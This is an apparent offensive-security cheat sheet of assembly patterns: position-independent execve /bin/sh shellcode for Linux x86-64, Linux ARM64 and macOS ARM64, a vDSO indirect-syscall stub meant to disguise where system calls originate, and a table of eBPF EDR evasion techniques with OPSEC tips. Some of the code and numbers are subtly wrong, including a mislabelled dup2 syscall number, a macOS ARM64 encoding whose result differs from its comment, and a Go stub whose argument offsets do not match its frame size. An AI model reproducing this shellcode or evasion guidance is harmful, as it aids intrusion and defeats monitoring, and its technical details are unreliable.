# Linux & macOS Offensive Assembly Patterns

## 1. Linux x86-64 Direct Syscall

### ABI
```
RAX = syscall number
RDI = arg1, RSI = arg2, RDX = arg3, R10 = arg4, R8 = arg5, R9 = arg6
Return: RAX (negative = errno negated)
Clobbered: RCX, R11
```

### Common shellcode syscalls
| Nr | Name | Typical use |
|---|---|---|
| 0  | read | stdin/socket |
| 1  | write | output |
| 2  | open | file open |
| 3  | close | fd cleanup |
| 11 | munmap | unmap |
| 32 | dup2 | redirect fd |
| 33 | dup2 (x86) | — |
| 59 | execve | shell |
| 60 | exit | exit(0) |
| 322 | execveat | execute fd |

### execve /bin/sh (x64, PIC)
```nasm
BITS 64
    xor   rax, rax
    push  rax                   ; null terminator for "/bin//sh"
    mov   rbx, 0x68732f2f6e69622f  ; "/bin//sh"
    push  rbx
    mov   rdi, rsp              ; ptr to path
    push  rax                   ; NULL envp
    push  rdi                   ; argv[0] = path
    mov   rsi, rsp              ; char *argv[]
    mov   rdx, 0                ; char *envp[] = NULL
    mov   al,  59               ; SYS_execve
    syscall
```

---

## 2. Linux vDSO Indirect Syscall

The vDSO (virtual DSO) is a kernel-mapped read-only page present in every Linux process.
It exposes a `SYSCALL;RET` gadget (and other clock/gettimeofday thunks).
Dispatching via this gadget makes RIP appear to be in a legitimate kernel-exported page.

### Finding the gadget
```c
// via auxiliary vector
uintptr_t vdso_base = getauxval(AT_SYSINFO_EHDR);

// or parse /proc/self/maps for "[vdso]"
// scan for [0x0F, 0x05, 0xC3] at vdso_base..vdso_base+0x2000
```

### Minimal Go Plan9 vDSO stub
```nasm
TEXT ·vdsoSyscall6(SB),NOSPLIT,$0-56
    MOVQ  num+0(FP),  AX
    MOVQ  a1+8(FP),   DI
    MOVQ  a2+16(FP),  SI
    MOVQ  a3+24(FP),  DX
    MOVQ  a4+32(FP),  R10
    MOVQ  a5+40(FP),  R8
    MOVQ  a6+48(FP),  R9
    MOVQ  gadget+56(FP), R11
    CALL  R11               ; dispatches via SYSCALL;RET in vDSO
    MOVQ  AX, ret+64(FP)
    RET
```

---

## 3. Linux eBPF Evasion Context

eBPF-based EDR (e.g., Falco, Tetragon) hooks syscalls via tracepoints at the kernel boundary.
Bypasses are limited since hooks run in kernel space, not userland:

| Technique | Evades eBPF? | Notes |
|---|---|---|
| vDSO indirect | No | RIP in vDSO, but syscall still traced at kernel boundary |
| Direct syscall | No | Same kernel boundary |
| PTRACE self-ptrace | Partial | Single-step may confuse some tools |
| io_uring | Partial | Some eBPF probes miss io_uring worker syscalls |
| userfaultfd | No | Kernel hooks see it |
| Syscall from kernel module | Yes (userland EDR) | Requires kernel access |

**Practical takeaway**: On Linux, eBPF hooks are much harder to bypass than Windows userland hooks.
Focus on OPSEC (clean log entries, timing, process names) rather than ABI tricks.

---

## 4. macOS ARM64 Syscall Patterns

### Syscall ABI
```
x16 = (class << 24) | number
  class 0 = Mach (0x00000xxx)
  class 1 = reserved (mdep)
  class 2 = BSD   (0x2000xxx)
x0..x7 = args 1-8
x0     = return value
svc #0x80
```

### BSD syscall numbers (common)
| x16 low | Name |
|---|---|
| 0x3B | execve |
| 0x04 | write  |
| 0x05 | open   |
| 0x06 | close  |
| 0x01 | exit   |

### execve /bin/sh (ARM64 macOS, PIC)
```nasm
BITS 64  ; aarch64

_start:
    // "/bin/sh\0" — 8 bytes
    adr  x0,  sh_str            ; ptr to path (PIC via ADR)
    eor  x1,  x1,  x1           ; NULL argv
    eor  x2,  x2,  x2           ; NULL envp
    movz x16, #0x3b             ; execve low 16 bits
    movk x16, #0x2000, lsl #16  ; BSD class -> x16 = 0x200003b
    svc  #0x80

sh_str:
    .asciz "/bin/sh"
```

### write syscall
```nasm
    mov  x0,  #1               ; fd=stdout
    adr  x1,  msg
    mov  x2,  #13              ; len
    movz x16, #0x4
    movk x16, #0x2000, lsl #16 ; 0x2000004 = write
    svc  #0x80
```

---

## 5. macOS x86-64 Syscall Patterns

Usage is similar to Linux but class bits shift the number:

```nasm
; write(1, msg, len) — macOS x64 BSD
    mov  rax, 0x2000004         ; (2 << 24) | 4 = BSD write
    mov  rdi, 1
    lea  rsi, [rel msg]
    mov  rdx, 13
    syscall
```

---

## 6. Linux ARM64 Shellcode

```nasm
// execve /bin/sh — Linux ARM64
_start:
    adr  x0,  sh_path           ; arg1 = path (PIC)
    eor  x1,  x1, x1
    eor  x2,  x2, x2
    mov  x8,  #221              // SYS_execve = 221 on Linux ARM64
    svc  #0

sh_path:
    .asciz "/bin/sh"
```

ARM64 Linux syscall numbers differ from x86-64; use `<asm/unistd.h>` or the syscall table at:
`/usr/include/asm-generic/unistd.h`.
